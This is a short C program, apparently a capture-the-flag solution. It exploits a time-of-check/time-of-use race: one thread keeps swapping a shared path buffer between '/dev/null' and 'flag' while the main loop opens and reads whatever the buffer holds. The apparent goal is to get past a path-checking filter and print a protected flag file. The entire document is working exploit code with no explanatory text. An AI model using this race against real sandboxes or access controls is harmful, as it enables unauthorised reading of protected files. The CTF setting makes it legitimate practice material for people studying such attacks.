#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INNOCENT "/dev/null"
#define FLAG "flag"

void *thread_func(void *arg) {
  while (true) {
    strcpy(arg, FLAG);
    strcpy(arg, INNOCENT);
  }
}

int main(void) {
  char path[32] = INNOCENT;
  pthread_t thread;
  ssize_t written;
  char flag[256];
  ssize_t count;
  int ret;
  int fd;

  ret = pthread_create(&thread, NULL, thread_func, path);
  assert(ret == 0);
  while (true) {
    fd = open(path, O_RDONLY);
    if (fd == -1) {
      continue;
    }

    count = read(fd, flag, sizeof(flag) - 1);
    close(fd);
    if (count < 0) {
      continue;
    }
    assert((size_t)count < sizeof(flag));
    flag[count] = 0;
    if (strcmp(flag, "") && strcmp(flag, "B415N{fake flag}\n")) {
      written = write(STDOUT_FILENO, flag, count);
      assert(written == count);
      return EXIT_SUCCESS;
    }
  }
}